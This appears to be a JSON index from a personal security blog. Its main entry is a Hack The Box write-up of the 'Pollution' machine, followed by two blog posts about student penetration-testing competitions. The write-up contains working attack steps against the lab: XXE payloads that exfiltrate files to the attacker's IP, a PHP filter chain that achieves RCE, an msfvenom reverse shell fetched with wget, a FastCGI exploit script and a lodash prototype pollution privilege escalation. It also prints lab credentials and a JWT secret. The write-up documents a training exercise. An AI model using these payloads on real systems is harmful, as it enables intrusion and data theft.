[ { "title": "Pollution", "url": "/posts/Pollution/", "categories": "Writeup", "tags": "htb", "date": "2023-03-14 00:00:00 -0700", "snippet": "PrefaceI’m not an expert in any way shape or form. Fully expect that some of this information may be inaccurate. It was my first time leveraging many of these vulnerabilities so the explanations may not be accurate. Most of the results were interpreted by me from what I’ve read to the best of my ability. If you spot something that is off, please let me know and I’ll make the changes accordingly.OverviewPollution is an awesome and difficult Linux box focusing around an interesting choice for a tech stack. A combination of a PHP site handled with PHP FPM and a NodeJS API says it all. This box had me going through all of my web knowledge in order to fully compromise the machine.The box begins with fuzzing for subdomains. One of which contains a log with information on gaining a admin account on the initial website. Admins have access to an API endpoint vulnerable to XXE. Chain this with SSRF and you can gain access to local files through out of bands exfiltration. Snoop around and you eventually find the password to the other subdomain and a password to the Redis database. Adjust your own cookie handled by the database to bypass authentication to the third site. Use the LFI to RCE chain to gain our first shell. Exploit FastCGI on port 9000 and we are able to pivot to Victor. For the final stretch of the machine, perform prototype pollution on the API to gain a root shell.ReconnaissanceNmapStarting Nmap 7.93 ( https://nmap.org ) at 2023-03-08 13:37 ESTNmap scan report for collect.htb (10.10.11.192)Host is up (0.077s latency).Not shown: 65532 closed tcp ports (reset)PORT STATE SERVICE22/tcp open ssh80/tcp open http6379/tcp open redisNmap done: 1 IP address (1 host up) scanned in 13.64 secondsInitial scans from the outside reveal 2 typical ports seen with nearly any Linux web server: SSH and HTTP. Interestingly enough, this web application uses a Redis database which I don’t often see.HTTP Site (80/tcp)Looks like a custom web application capable of handling registering for an account and logging in. Mentions of an API so we may be abusing that later. Site also seems to have error handling in the form of redirecting back to the main page if attempting to pull a page that does not exist. Visiting admin page redirects as a result of either access controls or routing. Default admin credentials don’t work either.SubdomainsCommand: gobuster vhost -u http://collect.htb/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --append-domain===============================================================Gobuster v3.2.0-devby OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)===============================================================[+] Url: http://collect.htb/[+] Method: GET[+] Threads: 10[+] Wordlist: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt[+] User Agent: gobuster/3.2.0-dev[+] Timeout: 10s[+] Append Domain: true===============================================================2023/03/08 13:26:40 Starting gobuster in VHOST enumeration mode===============================================================Found: forum.collect.htb Status: 200 [Size: 14102]Found: developers.collect.htb Status: 401 [Size: 469]===============================================================2023/03/08 13:37:38 Finished===============================================================DirectoriesCommand: gobuster dir -u http://collect.htb/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -t 50 -r --exclude-length 26197===============================================================Gobuster v3.2.0-devby OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)===============================================================[+] Url: http://collect.htb/[+] Method: GET[+] Threads: 50[+] Wordlist: /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt[+] Negative Status codes: 404[+] Exclude Length: 26197[+] User Agent: gobuster/3.2.0-dev[+] Follow Redirect: true[+] Timeout: 10s===============================================================2023/03/08 13:51:18 Starting gobuster in directory enumeration mode===============================================================/register (Status: 200) [Size: 4746]/login (Status: 200) [Size: 4740]/admin (Status: 200) [Size: 4740]/assets (Status: 200) [Size: 1500]/api (Status: 200) [Size: 4740]/home (Status: 200) [Size: 4740]/server-status (Status: 403) [Size: 276]===============================================================2023/03/08 13:56:32 Finished=============================================================== Note to self while enumerating websites Directories: When attempting to fuzz for directories on a website that redirects a lot, use the -r flag in gobuster and see where it goes to. Take that content length and exclude it with --exclude-length XXX characters. Vhosts: Not sure if this was a one off thing but I’ve been noticing that while debugging vhost fuzzing with gobuster they don’t append the rest of the domain. To get around this use the --append-domain flag and you will eventually find what you are looking for if it exists. Developers siteSo far, I cannot access this site as it requires basic authentication. We may be able to get through if we can find credentials somewhere.Forum siteSeems like a site for employees however it was publicly accessible. You can also sign up for an account here. One of the threads contains an interesting log file. A admin token for the website! token=ddac62a28254561001277727cb397bafThis was located inside the attached log file. The token can be used to create admin users at http://collect.htb/set/role/admin. All it needs to take is the PHPSESSID cookie so I can send in a POST request with my account’s cookie in order to turn it into an admin account.Redis Database (6379/tcp)By the looks of it, can’t really access this database without valid credentials.Initial Access: www-dataAdministrator siteSeems like the API being mentioned earlier comes into play here. Here we can register for the API. Intercepting the post request of this form is pretty interesting.API POST Request exampleInterestingly enough, seems like the API takes in requests in the format of XML. Vulnerability The output is in XML which is commonly vulnerable to XXEXXE → SSRF Out of Bands Exfiltration First off, what is XXE? XML External Entity or XXE for short is a type of vulnerability that occurs when an XML parser processes input containing a reference to an external entity hence the name. Generally speaking, XXE is used to disclose local files or at least, that is the extent to which I have been able to use it for in the past.While attempting basic XXE payloads from Hacktricks such as:&lt;!--?xml version=\"1.0\" ?--&gt;&lt;!DOCTYPE foo [&lt;!ENTITY example SYSTEM \"/etc/passwd\"&gt; ]&gt;&lt;data&gt;&amp;example;&lt;/data&gt;All I get is a fat error. This might be because the input I’m providing is a &lt;data&gt; tag and that the API is expecting certain data, but no matter how I adjust this or try to append this to a valid request, I only get failures. In retrospect for this type of payload, I believe data needs to be reflected somewhere in order to get the file’s contents to be outputted somewhere. When I get a valid request, all it says is a 200 okay.Another XXE attack I can try is to chain it with server side request forgery (SSRF). Here’s the new payload I can try:&lt;!ENTITY % file SYSTEM \"index.php\"&gt;&lt;!ENTITY % eval \"&lt;!ENTITY &amp;#x25; exfiltrate SYSTEM 'http://10.10.14.137/?x=%file;'&gt;\"&gt;%eval;%exfiltrate;This is going to be the contents of evil.dtd which will be requested in this kind of POST request for the manage_api argument.&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;!DOCTYPE foo [&lt;!ENTITY % xxe SYSTEM \"http://10.10.14.137/evil.dtd\"&gt; %xxe;]&gt;&lt;root&gt;\t&lt;method&gt;POST&lt;/method&gt;\t&lt;uri&gt;/auth/register&lt;/uri&gt;\t&lt;user&gt;\t\t&lt;username&gt;lmao&lt;/username&gt;\t\t&lt;password&gt;lmaoao&lt;/password&gt;\t&lt;/user&gt;&lt;/root&gt;What I am doing here is appending an external entity in evil.dtd which is hosted on my end and exfiltrates data back in the form of a get request to my system.Upon sending the request, it works! It is indeed vulnerable to XXE! The next issue is that we need to actually exfiltrate meaningful data. We know this is a PHP site since we have the cookie PHPSESSID so there is no reason for index.php to not be found unless we need to bypass some sort of filter. Well we can try just that with this new payload here. We just need to use a PHP filer instead.&lt;!ENTITY % file SYSTEM \"php://filter/convert.base64-encode/resource=index.php\"&gt;&lt;!ENTITY % eval \"&lt;!ENTITY &amp;#x25; exfiltrate SYSTEM 'http://10.10.14.137/?x=%file;'&gt;\"&gt;%eval;%exfiltrate;Bingo we get a hit! All we need to do is base64 decode this data and we get the contents of index.php. Wait wait wait, what’s going on? Let me try to explain what happened here. I sent in a valid post request utilizing an actual API request from earlier but appended the external entity into it. This is in the line: &lt;!DOCTYPE foo [&lt;!ENTITY % xxe SYSTEM \"http://10.10.14.137/evil.dtd\"&gt; %xxe;]&gt;This calls back to my webserver and loads in a file, index.php and sends it to my webserver again through the URL. So that base64 output you are seeing, that’s the index.php page encoded and sent straight back to me.Interesting Files&lt;?phprequire '../bootstrap.php';use app\\classes\\Routes;use app\\classes\\Uri;$routes = [ \"/\" =&gt; \"controllers/index.php\", \"/login\" =&gt; \"controllers/login.php\", \"/register\" =&gt; \"controllers/register.php\", \"/home\" =&gt; \"controllers/home.php\", \"/admin\" =&gt; \"controllers/admin.php\", \"/api\" =&gt; \"controllers/api.php\", \"/set/role/admin\" =&gt; \"controllers/set_role_admin.php\", \"/logout\" =&gt; \"controllers/logout.php\"];$uri = Uri::load();require Routes::load($uri, $routes);Lets analyze some of these files. First off we have the index page. Looks like we had some PHP routing in place. The bootstrap.php might be interesting. File dependencies tend to yield information. I do also want to point out that there might be a character limit or something preventing the full file to be loaded as if you take a look at the PHP file, there is no ending ?&gt;.&lt;?phpini_set('session.save_handler','redis');ini_set('session.save_path','tcp://127.0.0.1:6379/?auth=COLLECTR3D1SPASS');session_start();require '../vendor/autoload.php';Would you look at that, credentials for the Redis database from earlier. There is also an autoload.php however, upon looking into it, there is nothing interesting there. Info 1002:victorcollect.htb\tdevelopers.collect.htb\tforum.collect.htbThis information comes from /etc/group and /etc/hosts respectively. Most importantly, we have a potential user of interest in Victor. Oddly enough, I didn’t see any users with id 1000 or 1001.Looking back earlier, we still haven’t really tried the developers site just yet. With file read capabilities, we may be able to find credentials if we are lucky. My best guess is to try to find an .htaccess file commonly located within the /var/www/YOU_DOMAIN/.htaccess as pointed out by Digital Ocean. My suspicions were correct, there is an .htaccess file for this domain. The decoded contents only contain Options -Indexes which just prevents directory listing and throws a 403 error instead which makes sense as earlier during the fuzzing, that was the error I received. Oddly enough, there is no mention of authentication in this file but it may be a result of being unable to load the full file as we have been seeing earlier. Regardless, its still worth a shot to find a .htpasswd file either in this directory or up somewhere apache2 is installed.This payload worked and we have the contents of the .htpasswd file. The username is developers_group and the password can hopefully be cracked using a tool like john. I tried Hashcat however, it wouldn’t take the hash.Command: john hash --wordlist=/usr/share/wordlists/rockyou.txt Info developers_group:$apr1$MzKA5yXY$DwEz.jxW9USWo8.goD7jY1developers_group:r0cketWith the developers site password and the Redis database password, we should have enough information from XXE to move on.Developers siteNew site new login page, again. Reusing any of the creds earlier fails here. I let SQLmap run against this however, nothing was found. I’ll be returning to this site later with either creds or an alternate way to bypass the login page.Since I can’t get any authentication going, best I can do is retrieve some files. Info if (!isset($_SESSION[‘auth’]) or $_SESSION[‘auth’] != True)This section in the index.php sticks out to me. We’ll revisit this later.Redis Database Quick Redis Cheat Sheet PING: Responds with PONG if you are authenticated INFO KEYSPACE: Information regarding keys KEYS *: Shows all keys GET &lt;KEY&gt;: Outputs the information stored in the key SET &lt;KEY&gt;: Change key valueFirst time using a Redis database, I used mainly these commandsCredentials are valid and here we were able to spill some information. Those 2 keys that popped up are my PHPSESSID values. the one with 8sod was the one I’ve been using for the main site and the mrr3 is the new session ID I got for the dev site.As we can see, these are the key contents of the associated PHPSESSID values. If anyone isn’t familiar with this layout, this is just a serialized PHP string. What’s a PHPSESSID and why is this important? A PHPSESSID is a cookie commonly given out most if not all PHP sites. These are session identifiers that correspond with a actual data on the back end that stores information such as your username or even an email associated with your account. Note that this value is just an identifier— an arbitrary value. In this Redis database however, we are able to see the values of the cookie and even manipulate meaning we can create our own cookie with its own set values. How can we abuse this? Well, if we can sign cookies with any value, it would be possible to spin up a “session” for an account that doesn’t exist and possibly even bypass authentication such as the one seen on the /login.php of the developers site.Revisiting Developers SubdomainBypassing AuthenticationThe information in our admin cookie is as follows: \"username|s:4:\\\"bruh\\\";role|s:5:\\\"admin\\\";\"Currently, the cookie we have for the dev site is empty. Looking back onto the index.php, we see that the session cookie needs to contain an “auth” value and set to be “True” in order to gain access to the site. We can set our cookie in the Redis database and refresh our page to get through. Take a look at this demo: Looks like we are in! Every page here seems to be static but there is one key thing to take note of here.PHP LFI → RCE Chain Vulnerability Possible LFI on a PHP site! LFI → PHP RCE Chain is a valid candidate to test.Initial tests with standard LFI payloads is not displaying anything but since this is a PHP site, I jumped the gun and went straight for the chain. There is a nice tool that can generate chains for us and this was the the command I used:Command: python3 [lfi.py](http://lfi.py/) --chain '&lt;?php system(\"whoami\"); ?&gt;'Look at that! We have command execution! Unless there is a firewall in our way, shell is just across the horizon.We have a road block. The command chains I am passing through are becoming too long for the server to handle. Attempting to run a bash reverse shell contains too many characters. Even something like this is too long when chained: &lt;?php system(\"wget [http://10.10.14.152/a](http://10.10.14.152/a)\"); ?&gt;We need to find a way to shorten this code to allow myself to upload a shell. Apparently in PHP, as I was just taught from ChatGPT, system commands can be shorted by using ``` instead. The &lt;?php can also be shortened with &lt;?= to save 2 characters. You can also remove the http:// in the wget request.With this chain of commands, I was able to get RCE: Create msfvenom payload msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.152 LPORT=4444 -f elf &gt; a Drop payload on disk wget 10.10.14.152/a -O /tmp/a Change permissions chmod 777 /tmp/a Activate /tmp/a With all that, we finally have access to the network :)Pivot: www-data → VictorBasic EnumerationInterestingly enough, despite our file read through XXE earlier, we couldn’t read login.php despite it existing. Here is the interesting part of it though:$db = new mysqli(\"localhost\", \"webapp_user\", \"Str0ngP4ssw0rdB*12@1\", \"developers\");$db-&gt;set_charset('utf8mb4'); We have plaintext credentials!! webapp_user:Str0ngP4ssw0rdB*12@1Credentials obtained and noted. Next up is where to use them.netstat -tulpn shows us quite a bit of information on this box actually. 3306 is expected as we have database credentials so I’ll be enumerating that shortly. There is also a port 9000 which I never seen before as well as 3000 which might be either Werkzeug, GitTea, a proxy of some sort, or something else.MariaDB (3306/tcp)MariaDB [(none)]&gt; show databases;show databases;+--------------------+| Database |+--------------------+| developers || forum || information_schema || mysql || performance_schema || pollution_api || webapp |+--------------------+7 rows in set (0.001 sec)MariaDB seems to house many databases. Many of which seem to belong to the various domains on the machine. Developers contains an admin user whos password hash remained uncrackable. Forum contains password hashes and salts for Victor, the user of interest, among many others yet none were crackable either. Webapp was the main site. pollution_api seems pretty empty with empty users and empty messages. Though considering the box name, we may be revisiting this later.ExpressJS API (3000/tcp)This port happened to just be a API handler. I looked back into the source code of some of the pages we used earlier like bootstrap.php and it mentioned curling requests to port 3000. I guess this is where that comes into play. As of right now we can’t really do much. It requires authentication to play with its functionality and there’s no leads there.FastCGI (9000/tcp)First time seeing this port open. Hacktricks seems to have an article on this port so I will be testing that out shortly. I also found that by running linpeas under the cleaned processes tab, I saw this:victor 1113 0.0 0.3 265840 15836 ? S Mar10 0:00 _ php-fpm: pool victor victor 1114 0.0 0.3 265840 15836 ? S Mar10 0:00 _ php-fpm: pool victorphp-fpm is FastCGI Process Manager so this should confirm what the port 9000 is. That being said, time to test the Hacktricks payloads.This was the payload I ended up using. No need to create a long reverse shell payload if I know this is run as Victor. I can just reuse the payload I dropped earlier.#!/bin/bashPAYLOAD=\"&lt;?php echo '&lt;!--'; system('/tmp/a'); echo '--&gt;';\"FILENAMES=\"/var/www/developers/index.php\" # Exisiting file pathHOST=$1B64=$(echo \"$PAYLOAD\"|base64)for FN in $FILENAMES; do OUTPUT=$(mktemp) env -i \\ PHP_VALUE=\"allow_url_include=1\"$'\\n'\"allow_url_fopen=1\"$'\\n'\"auto_prepend_file='data://text/plain\\;base64,$B64'\" \\ SCRIPT_FILENAME=$FN SCRIPT_NAME=$FN REQUEST_METHOD=POST \\ cgi-fcgi -bind -connect $HOST:9000 &amp;&gt; $OUTPUT cat $OUTPUTdoneAfter running this bash script, we are in as Victor.Privesc: Victor → RootBasic EnumerationSeems like Victor is the owner of the pollution_api. I guess this is the API that they have been advertising on their main site.It’s pretty neat to see that this was hinted at so early into the box. The premise for the box is fairly consistent.Revisiting the line earlier spit out by linpeas strikes me as interesting:root 1364 0.0 1.8 1663556 75120 /usr/bin/node /root/pollution_api/index.jsAlthough the process is run as root, it’s Victor, our current user, who is the owner of the file. Regardless, lets take a look at the API’s source code.routes/documentation.jsconst express = require('express');const router = express.Router();router.get('/',(req,res)=&gt;{ res.json({ Documentation: { Routes: { \"/\": { Methods: \"GET\", Params: null }, \"/auth/register\": { Methods: \"POST\", Params: { username: \"user\", password: \"pass\" } }, \"/auth/login\": { Methods: \"POST\", Params: { username: \"user\", password: \"pass\" } }, \"/client\": { Methods: \"GET\", Params: null }, \"/admin/messages\": { Methods: \"POST\", Params: { id: \"messageid\" } }, \"/admin/messages/send\": { Methods: \"POST\", Params: { text: \"message text\" } } } }functions/jwt.jsconst jwt = require('jsonwebtoken');const SECRET = \"JWT_COLLECT_124_SECRET_KEY\"const signtoken = (payload)=&gt;{ const token = jwt.sign(payload, SECRET, { expiresIn: 3600 }); return token;}const decodejwt = (token)=&gt;{ return jwt.verify(token, SECRET, (err, decoded)=&gt;{ if(err) return false; return decoded; });}module.exports = { signtoken, decodejwt};routes/auth.jsconst express = require('express');const router = express.Router();const User = require('../models/User');const { decodejwt } = require('../functions/jwt')//controllersconst { messages } = require('../controllers/Messages');const { messages_send } = require('../controllers/Messages_send');router.use('/', async(req,res,next)=&gt;{ if(req.headers[\"x-access-token\"]){ const token = decodejwt(req.headers[\"x-access-token\"]); if(token){ const find = await User.findAll({where: {username: token.user, role: token.role}}); if(find.length &gt; 0){ if(find[0].username == token.user &amp;&amp; find[0].role == token.role &amp;&amp; token.role == \"admin\"){ return next(); } return res.json({Status: \"Error\", Message: \"You are not allowed\"}); } return res.json({Status: \"Error\", Message: \"You are not allowed\"}); } return res.json({Status: \"Error\", Message: \"You are not allowed\"}); } return res.json({Status: \"Error\", Message: \"You are not allowed\"});})router.get('/',(req,res)=&gt;{ res.json({Status: \"Ok\", Message: 'Read documentation from api in /documentation'});})router.post('/messages',messages);router.post('/messages/send', messages_send);module.exports = router;routes/admin.jsconst express = require('express');const router = express.Router();const User = require('../models/User');const { decodejwt } = require('../functions/jwt')//controllersconst { messages } = require('../controllers/Messages');const { messages_send } = require('../controllers/Messages_send');router.use('/', async(req,res,next)=&gt;{ if(req.headers[\"x-access-token\"]){ const token = decodejwt(req.headers[\"x-access-token\"]); if(token){ const find = await User.findAll({where: {username: token.user, role: token.role}}); if(find.length &gt; 0){ if(find[0].username == token.user &amp;&amp; find[0].role == token.role &amp;&amp; token.role == \"admin\"){ return next(); } return res.json({Status: \"Error\", Message: \"You are not allowed\"}); } return res.json({Status: \"Error\", Message: \"You are not allowed\"}); } return res.json({Status: \"Error\", Message: \"You are not allowed\"}); } return res.json({Status: \"Error\", Message: \"You are not allowed\"});})router.get('/',(req,res)=&gt;{ res.json({Status: \"Ok\", Message: 'Read documentation from api in /documentation'});})router.post('/messages',messages);router.post('/messages/send', messages_send);module.exports = router;controllers/Send_messages.jsconst Message = require('../models/Message');const { decodejwt } = require('../functions/jwt');const _ = require('lodash');const { exec } = require('child_process');const messages_send = async(req,res)=&gt;{ const token = decodejwt(req.headers['x-access-token']) if(req.body.text){ const message = { user_sent: token.user, title: \"Message for admins\", }; _.merge(message, req.body); exec('/home/victor/pollution_api/log.sh log_message'); Message.create({ text: JSON.stringify(message), user_sent: token.user }); return res.json({Status: \"Ok\"}); } return res.json({Status: \"Error\", Message: \"Parameter text not found\"});}module.exports = { messages_send };Alright that’s a lot of files listed, but let me save you from the pain I suffered from staring between these JavaScript files for a couple hours. We have a JWT secret!! const SECRET = “JWT_COLLECT_124_SECRET_KEY”This will allow us to sign ourselves a cookie if necessary.const token = decodejwt(req.headers[\"x-access-token\"]);\tif(token){\t\tconst find = await User.findAll({where: {username: token.user, role: token.role}}); \t\t\tif(find.length &gt; 0){\t\t\t if(find[0].username == token.user &amp;&amp; find[0].role == token.role &amp;&amp; token.role == \"admin\"){\t\t\t return next();\t\t }It looks like we need an admin role in order to access some parts of the API and set that within a request header named “x-access-token”.const { exec } = require('child_process');...\t\t_.merge(message, req.body);\t\texec('/home/victor/pollution_api/log.sh log_message'); What so important about this excerpt? After luckily landing on XCT’s video regarding Unobtanium, he mentioned that there is a specific vulnerability in JavaScript regarding the _.merge function. How can we abuse all of this? Well, our attack chain is going to be quite an interesting one but here is the attack plan all laid out. First we need to go into MariaDB and create a user with admin privileges. The db user is in charge of the web application in general so we should have write access. After creating our user, we need to login so that we can obtain a JWT for authentication. Pass in the JWT to allow us to make requests to the /admin/messages/send endpoint. Reason being that this is vulnerable to prototype pollution. Since this is run as root, we most likely will be gaining a root shell if all this is done properly.Requesting AuthenticationFirst create user in MariaDBCommand: INSERT INTO users (username, password, role, createdAt, updatedAt) VALUES ('admin', 'password123', 'admin', NOW(), NOW());Ignore the first user, that was me testing the registration endpoint mentioned in the documentation. But now that we have a valid admin we can login as, we can request a authentication cookie after logging in.Note that I used chisel to port forward traffic from 3000 to my 3000.Command: curl localhost:3000/auth/login -X POST -d '{\"username\": \"admin\", \"password\": \"password123\"}' -H \"Content-Type: application/json\"Status\t:\tOk\tHeader\t\t{1} x-access-token\t: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9eyJ1c2VyIjoiYWRtaW4iLCJpc19hdXRoIjp0cnVlLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE2Nzg2OTQzMjAsImV4cCI6MTY3ODY5NzkyMH0ibw-iaP8Ca-uHOvQvLDpABGUWpcirqNoUKAUlOgmjvQNow we have a JWT we can pass in. It’s only valid for 1 hour so we shouldn’t stop here.Prototype Pollution → RCEWith our JWT, we can begin making requests to the /admin endpoint that was not accessible earlier. (Although I didn’t show that it was inaccessible without the cookie, you’re just going to have to take my word for it). As mentioned earlier, those few lines in the Send_messages.js are vulnerable to prototype pollution. What is prototype pollution? Prototype pollution is a vulnerability that exists within JavaScript when there is a function that merges data that the user can control. The by injecting into an object’s prototype, we can assign malicious values into all instances of the inherited object. Like all other user input-controlled vulnerabilities, this can be mitigated through input sanitization. For a more detailed description please give the PortSwigger article a read. if(req.body.text){ const message = { user_sent: token.user, title: \"Message for admins\", }; _.merge(message, req.body); exec('/home/victor/pollution_api/log.sh log_message'); Message.create({ text: JSON.stringify(message), user_sent: token.user });Back to the vulnerable code, if we send in something like {\"text\": '{\"__proto__\": {\"shell\": \"/path/to/executable\"}}'} , we can get RCE. ExplanationHere, the __proto__ property is set to an object that has a shell property with a value of the executable path. By doing this, the attacker has modified the prototype of the merged object, allowing them to add arbitrary properties or methods to the object.Later in the code, the exec() function is called with a shell command that uses the log.sh script to log a message. Since the attacker has modified the prototype of the merged object, the exec() function will search for the shell property in the object’s prototype chain and find it there. This will cause the shell command to execute the attacker’s specified executable path, which is a security vulnerability.That being said, I can just reuse my payload I dropped earlier to gain shell as root since we know this API is being executed as root." }, { "title": "CPTC Regionals & Globals", "url": "/posts/CPTC/", "categories": "Blog", "tags": "competitions", "date": "2023-02-03 00:00:00 -0800", "snippet": "PrefaceCollegiate Penetration Testing Competition or CPTC, is an event that emulates what a real world penetration test is like. From scoping out the fictitious company, to the real engagement, dealing with angry clients, and even presentations— the whole package. This blog will serve to cover the whole journey from my start to the end of the Global event. If you are here to learn about the details of how we won, you’ll be disappointed as I’m writing about my experiences rather than the formula to win.Prior To The Main RosterI’ve detailed my experiences in the past blog posts about what I’ve done before making the team so be sure to check those out. In short, I failed my first attempt at making the team in 2021. After failing so horribly, I didn’t want to relive that experience so I made sure to study my ass off for the next tryouts. For starters I’ve became more active in the club SWIFT or Students With an Interest in the Future of Technology. The rest of my experiences are detailed out in previous posts.After Making The TeamAbout a few days after the tryouts, I was called into a private zoom call regarding the Minecraft server that was being run in the club. They called me in about me officiating the server to which I had no clue what they were talking about. They realize their mistake and said “I got the wrong person, hmm Derrick, oh! How would you like a main spot on the CPTC team?”. I appreciated their little skit they came up for me, it really made my day.During the time leading up to the Western Regional event, our team met up every Saturday to discuss the logistics and some team planning in general. The technical stuff was mostly learned by ourselves during the week and we tend to share the topics that we found interesting on the weekend meetings. At the time the Regional event was 3 months away but before I even knew it, I was already in the van headed out to Stanford for the competition.The Regional EventThe drive up to Stanford was, to say the least, very memorable. From how uncomfortable it was due to the lack of space to the stupid little inside jokes that ran rampant— I’ve enjoyed every last minute of it. It was about a 6 hour car ride and I managed to sleep past most of it but eventually we got up to San Jose. Stopping by at a burger place first to refuel up, we set off for the hotel to drop off our bags and all. The hotel roomAfter settling down at our hotel, we set off to check out Stanford’s campus to get an idea of what we will be working with. The campus is breathtaking compared to our school in Pomona. What I didn’t expect was that all the teams are competing in a single large venue. I imagined that we would have our own private room but it is not a big issue. Stanford’s venueAfter checking out the campus, our team went out to various stores in order to stock up on snacks and other essentials for the competition day. My brother for example got a bottle of unsalted chicken broth in which he used it as his fuel for the following day. Interesting choices to say the least.On the day of the competition, we rolled up in a full suit with ties and all. We assumed that this was going to be a formal engagement but when we arrived, we saw another team, if my memory serves me correctly, UC Riverside. They had such comfy causal clothes and best of all, they even were playing on a switch. Needless to say, we looked like try hards. Anything less than a first place win at the event would make us look like idiots. The team in actionThe competition started at around 9am and ran through until about 4 or 5pm. By the end of the event, my brain felt like it was melting. Roughly 8 hours of constantly trying to piece puzzles together was a tough experience and it was only the first half of the event. After we finished the main engagement, we went back to our hotels immediately to being our report writing. With a handful more findings than expected, the report writing took much longer than anticipated. We worked every minute off as a team until the deadline. Our end product was still unrefined and upon turning it in at midnight, there was a stark silence in the room. Everyone knows the obvious mistakes that were on the report but we just had to bear with it and hope for the best.The following day, we went back onto their campus for the awards ceremony. We probably should have networked a bit more than we did but its in the past now. I am glad that we did get to meet a few of the Stanford competitors as they were actually really cool people. I was under the impression that they were some untouchable entities as they have a reputation for being extremely smart but after a conversation, that stereotype completely crumbled away. During the awards ceremony, if my memory is correct, 3rd place went to Oregon State, second was Stanford, and first place was us, Cal Poly Pomona, for the second year in a row. Placement University 1st Place California Polytechnic University, Pomona 2nd Place Stanford University 3rd Place Oregon State University Global CPTCAbout 2 months later and here comes the main event, the global stage. In terms of preparation, not much as changed from how we approached Western Regionals. The biggest change really was the amount of packing I needed to do. The flight was at 5am so I decided to stay up the night and hang out with my friends on Discord as I packed up. Long story short, we get to the airport and board our flight. Right before takeoffDue to the layovers and all and being unable to get a good rest on our flight, most of us were pretty exhausted by the time we got to the hotel in Rochester. Note that we got to the rooms by around 5pm and that we needed to get moving again at 7pm to get our badges. While in line, two of the team members decide to act like as if they completely lost it making the most ridiculous egg jokes. It didn’t even make sense but they kept repeating it anyways. It did not make the greatest impression among the other people in line with us however, when we went up to receive our badges, the person said “Oh, Cal Poly?”. The teams that heard immediately started somewhat pointing fingers at us. It felt as if there was a giant target that was suddenly placed on our back.Later that night we went to have a team dinner at this barbecue place. It was my first time eating American barbecue since most of the time I would have Korean or Brazilian instead. It was the first meal in more than 24 hours for some of us and we made sure to make the most out of it. Dinosaur Bar-B-QueOn the day that we landed, it was really rainy to my surprise. I remember about a month ago hearing Buffalo on the news regarding all the record breaking snowfall and expected something similar. To my surprise, there was no snow at all and it was just wet. The following day however, just before the competition’s first day, snow came down like crazy and it ended up looking like this over the course of a few hours. Snowfall from the previous nightHere is another picture taken from inside the RIT campus. Inside campus viewUnlike regionals, the global event takes place over the course of 3 days, 2 for the actual engagement and 1 for presentations. The first two days went much better than expected for us this year. We had set the bar pretty low for ourselves and were extremely impressed with the amount of items we found to add to the report. Aside from reporting however, there also was a new aspect that the regional competition did not include, client interactions. Sometimes depending on our activity, a client would come into our room to ask us about X, Y and Z. Our business team handled each of the interactions so well, I just stared in awe the entire time. Sleep was an issue once again during this event as I only got about 10 hours of sleep… across 3 days. Not the most ideal conditions if you need to be performing at a high level.The first two days went without a hitch. It was nice having a private room to ourselves because it lets us go loose when we needed to. From driving an imaginary car throughout the room to doing a group griddy, we have done it all. Really helped keep up the morale as we stared at our computers for hours at a time. The presentations were the only thing left between us and the awards ceremony.On that third and final day, we were called into the main conference room to wait as teams eventually get called up. As a waiting activity, the event organizers provided us with slide decks for us to present for fun. The catch is, you don’t get to see what are the contents of slides and you have to act as if you are a professional on the topic. It was a pretty fun activity to watch as people went up and had to figure out how to deal with their slides. At some point we exhausted all the slides and nothing was on the board. One of the competitors decided to go up and play Bedwars, a game on minecraft, on the big screen while nothing was going on. One of our teammates is a huge fan and avid player of the game so it was pretty funny to see him critique the way the that she would play. Another one of use even did a live play by play. Overall it was pretty entertaining and helped me iron out my nerves before the big moment. Bedwars girlUnfortunately, with the way that things went, we somehow ended up being the last team to present. After going through my lines probably over a 100 times in my head at that point, I was a machine ready to spit out my content when it was my turn. The RIT command center was very impressive. The whole theme of the room felt like a mission control center. Walking up to be the center of attention made me feel like some sort of celebrity. The presentation overall went pretty well and we headed back to the rooms for the announcement. PresentationIt was really nice to hear from the event’s sponsors. The stories and advice they had to give us, it was more entertaining than I thought it would be. As the awards ceremony approached my heart only sped up. I was really excited to see how well we did. In third we had University of Central Florida, a big name in cyber and a regular on the national scene in CCDC, the older brother to CPTC. We waited quietly to hear the second place call and when Stanford got called up, we breathed a sigh of relief. If they got second, that means if things went the same way as they did during regionals, we would get first. Lo and behold, we got first place. Global champions for the second year in a row, and my first win at a major competition. Placement University 1st Place California Polytechnic University, Pomona 2nd Place Stanford University 3rd Place University of Central Florida Final ThoughtsFor anyone who is interested in competing in the event, here’s a few key takeaways: Get enough sleep Make sure to eat and drink plenty of water It is a marathon, not a raceIt sounds like obvious tips but they are true. The event is long and grueling so having proper meals and resting well is essential to perform well throughout the event.Overall I really enjoyed my first time competing at CPTC and it was an amazing feeling to be called up as the first place winners. I hope to see the same faces again next year when we come back." }, { "title": "RvB Fall 2022", "url": "/posts/RvBFall2022/", "categories": "Blog", "tags": "swift, competitions, rvb", "date": "2022-12-18 00:00:00 -0800", "snippet": "This is the second entry in the RvB series. Red versus Blue, more commonly referred to as RvB, is an event held by SWIFT every semester. During this competition, you, the player, can sign up with up to 3 other people to form a squad of 4. With your squad, you are given a network of X amount of boxes to secure and defend as an active red team attempts to break in and take down your services. Meanwhile all of this chaos is brewing, the manager of the event is also handing out tasks called injects. It’s pretty fun and I recommend people to take part in it if they ever get the chance.No Longer CompetingSpring RvB was not my first time competing as I might’ve mentioned previously, but rather that was my 4th RvB event and 2nd “official” one. Going into my 5th one, rather than using my experience to come out on top, I was recruited into the Red Team to operate as an adversary against 20 teams. This would also come in handy for the upcoming CPTC Western Regionals event.Structural ChangesFall RvB presents the competitors with a few new unexpected aspects to the event. There is now a mail server to send injects through. The biggest change they implemented was that social engineering was now in scope. This means that authorized organizers of the event can attempt to ask for passwords from teams and pass it on to the red team.Messy Things HappenWith so many new changes, it is not an understatement to call this event experimental. After the event has commenced, I was allowed to begin operating about 30 minutes to allow the teams to setup. For some reason, despite being told ahead of time that there were so many teams, I forgot to scale my attacks appropriately leading me to do everything manually. I lost a lot of time doing this but at least I had my 